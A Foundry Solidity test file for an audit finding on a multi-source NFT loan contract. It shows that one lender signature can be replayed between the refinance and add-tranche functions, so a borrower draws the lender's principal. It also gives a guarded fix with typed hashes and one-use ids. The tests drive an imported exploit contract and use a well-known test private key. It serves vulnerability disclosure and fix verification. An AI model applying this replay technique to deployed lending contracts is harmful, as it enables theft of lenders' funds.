// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import {
    Exploit,
    MultiSourceLoan,
    PrincipalToken,
    Terms
} from "./35219-h-17-refinancefulladdnewtranche-reusing-a-lenders-signature.sol";

/// Fix: type tag in the offer hash, and the renegotiation id is consumed on use.
contract GuardedLoan {
    uint8 public constant KIND_REFINANCE = 1;
    uint8 public constant KIND_NEW_TRANCHE = 2;

    PrincipalToken public immutable token;
    address public borrower;
    uint256 public principal;
    uint256 public trancheCount;
    uint256 public paidToBorrower;
    uint256 public pulledFromLender;
    bool public seeded;
    mapping(address => mapping(uint256 => bool)) public consumed;

    constructor(PrincipalToken _token) {
        token = _token;
    }

    function seed(address _borrower) external {
        require(!seeded, "seeded");
        borrower = _borrower;
        principal = Terms.PRINCIPAL;
        trancheCount = 1;
        seeded = true;
    }

    function digest(MultiSourceLoan.RenegotiationOffer memory offer, uint8 kind) public view returns (bytes32) {
        bytes32 structHash = keccak256(
            abi.encode(
                keccak256(
                    "GuardedRenegotiation(uint8 kind,uint256 renegotiationId,uint256 loanId,address lender,uint256 principalAmount,uint256 aprBps,uint256 expirationTime,uint256 duration)"
                ),
                kind,
                offer.renegotiationId,
                offer.loanId,
                offer.lender,
                offer.principalAmount,
                offer.aprBps,
                offer.expirationTime,
                offer.duration
            )
        );
        bytes32 domain = keccak256(
            abi.encode(
                keccak256("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"),
                keccak256(bytes("GONDI_MULTI_SOURCE_LOAN")),
                keccak256(bytes("3")),
                block.chainid,
                address(this)
            )
        );
        return keccak256(abi.encodePacked(hex"1901", domain, structHash));
    }

    function _check(MultiSourceLoan.RenegotiationOffer calldata offer, bytes calldata signature, uint8 kind) private view {
        require(signature.length == 65, "sig len");
        bytes32 r;
        bytes32 s;
        uint8 v;
        assembly {
            r := calldataload(signature.offset)
            s := calldataload(add(signature.offset, 32))
            v := byte(0, calldataload(add(signature.offset, 64)))
        }
        address recovered = ecrecover(digest(offer, kind), v, r, s);
        require(recovered == offer.lender && recovered != address(0), "sig");
    }

    function refinanceFull(MultiSourceLoan.RenegotiationOffer calldata offer, bytes calldata signature) external {
        require(seeded, "seed");
        require(msg.sender == borrower, "caller");
        require(!consumed[offer.lender][offer.renegotiationId], "consumed");
        _check(offer, signature, KIND_REFINANCE);
        consumed[offer.lender][offer.renegotiationId] = true;

        token.transferFrom(offer.lender, Terms.OLD_LENDER, principal);
        pulledFromLender = principal;
        paidToBorrower = 0;
        // Replacement: still one tranche, same principal, now owed to the signing lender.
        trancheCount = 1;
    }

    function addNewTranche(MultiSourceLoan.RenegotiationOffer calldata offer, bytes calldata signature) external {
        require(seeded, "seed");
        require(!consumed[offer.lender][offer.renegotiationId], "consumed");
        _check(offer, signature, KIND_NEW_TRANCHE);
        consumed[offer.lender][offer.renegotiationId] = true;
        uint256 draw = offer.principalAmount;
        token.transferFrom(offer.lender, borrower, draw);
        principal += draw;
        trancheCount += 1;
        pulledFromLender = draw;
        paidToBorrower = draw;
    }
}

contract Finding35219Test is Test {
    address constant ATTACKER = 0x1111111111111111111111111111111111111111;
    uint256 constant LENDER_PK = 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80;
    address constant LENDER = 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266;
    // Playground's first CREATE from 0x1111… is nonce 1 (ethereumjs), not nonce 0.
    address constant EXPLOIT = 0x15452EC016c4dc8c549E7fe6Ff4b26324Ea8b7A4;
    address constant TOKEN = 0x8ea53755A6CB335DD77e8DfBE91078CF210015C7;
    address constant LOAN = 0x671D353A77015fA0B747f24eb2a50b0E3340BD1d;

    function _deploy() internal returns (Exploit e) {
        vm.chainId(1);
        vm.setNonce(ATTACKER, 1);
        vm.prank(ATTACKER);
        e = new Exploit();
    }

    function test_embedded_signature_is_the_lender_key() public {
        Exploit e = _deploy();
        assertEq(address(e), EXPLOIT, "exploit");
        assertEq(address(e.token()), TOKEN, "token");
        assertEq(address(e.loan()), LOAN, "loan");
        assertEq(vm.addr(LENDER_PK), LENDER, "lender");
        bytes32 digest = e.loan().digest(e.loan().previewOffer());
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(LENDER_PK, digest);
        assertEq(abi.encodePacked(r, s, v), e.lenderSignature(), "embedded sig drifted");
    }

    function test_exploit_second_tranche_pulls_signed_principal() public {
        Exploit e = _deploy();
        e.run();

        assertEq(e.profit(), 1000 ether, "borrower profit");
        assertEq(e.token().balanceOf(address(e)), 1000 ether, "borrower balance");
        assertEq(e.token().balanceOf(LENDER), 0, "lender balance");
        assertEq(e.outstanding(), 2000 ether, "outstanding");
        assertEq(e.trancheCount(), 2, "tranches");
        assertEq(e.seniorLender(), Terms.OLD_LENDER, "senior");
        assertEq(e.juniorLender(), LENDER, "junior");
        assertEq(e.juniorFloor(), 1000 ether, "floor");
        assertEq(e.loan().paidToBorrower(), 1000 ether, "paid");
        assertEq(e.loan().pulledFromLender(), 1000 ether, "pulled");
        assertFalse(e.loan().isRenegotiationOfferCancelled(LENDER, Terms.RENEG_ID), "consumed");

        // Same signature again. The loan id was replaced, but the offer was not consumed.
        MultiSourceLoan book = e.loan();
        MultiSourceLoan.RenegotiationOffer memory offer = book.previewOffer();
        MultiSourceLoan.Loan memory again = e.existingLoan();
        bytes memory sig = e.lenderSignature();
        vm.expectRevert(bytes("loan"));
        book.addNewTranche(offer, again, sig);
        assertFalse(e.loan().isRenegotiationOfferCancelled(LENDER, Terms.RENEG_ID), "consumed after");
    }

    function test_same_signature_refinance_pays_borrower_zero() public {
        Exploit e = _deploy();
        e.showSignedRefinance();

        assertEq(e.token().balanceOf(address(e)), 0, "borrower was paid");
        assertEq(e.token().balanceOf(LENDER), 0, "lender kept the principal");
        assertEq(e.token().balanceOf(Terms.OLD_LENDER), 1000 ether, "old lender not repaid");
        assertEq(e.loan().paidToBorrower(), 0, "paid");
        assertEq(e.loan().pulledFromLender(), 1000 ether, "pulled");
        assertFalse(e.loan().isRenegotiationOfferCancelled(LENDER, Terms.RENEG_ID), "consumed");
    }

    function test_control_commitment_consumed_second_use_reverts() public {
        vm.chainId(1);
        PrincipalToken token = new PrincipalToken();
        GuardedLoan guarded = new GuardedLoan(token);
        guarded.seed(address(this));
        token.mintAndApprove(LENDER, address(guarded), 1000 ether);

        MultiSourceLoan catalog = new MultiSourceLoan(token);
        MultiSourceLoan.RenegotiationOffer memory offer = catalog.previewOffer();

        bytes32 digest = guarded.digest(offer, 1); // KIND_REFINANCE
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(LENDER_PK, digest);
        bytes memory sig = abi.encodePacked(r, s, v);

        vm.expectRevert(bytes("sig"));
        guarded.addNewTranche(offer, sig);
        assertEq(token.balanceOf(LENDER), 1000 ether, "wrong function pulled");
        assertFalse(guarded.consumed(LENDER, Terms.RENEG_ID), "consumed early");

        guarded.refinanceFull(offer, sig);
        assertTrue(guarded.consumed(LENDER, Terms.RENEG_ID), "not consumed");
        assertEq(token.balanceOf(address(this)), 0, "refinance paid the borrower");
        assertEq(token.balanceOf(Terms.OLD_LENDER), 1000 ether, "old lender");
        assertEq(token.balanceOf(LENDER), 0, "lender");
        assertEq(guarded.principal(), 1000 ether, "principal changed");
        assertEq(guarded.trancheCount(), 1, "tranche added");
        assertEq(guarded.paidToBorrower(), 0, "paid");

        vm.expectRevert(bytes("consumed"));
        guarded.refinanceFull(offer, sig);
        vm.expectRevert(bytes("consumed"));
        guarded.addNewTranche(offer, sig);
        assertEq(token.balanceOf(address(this)), 0, "second use paid the borrower");
        assertEq(token.balanceOf(LENDER), 0, "second use pulled again");
        assertEq(guarded.principal(), 1000 ether, "second use grew principal");
    }
}
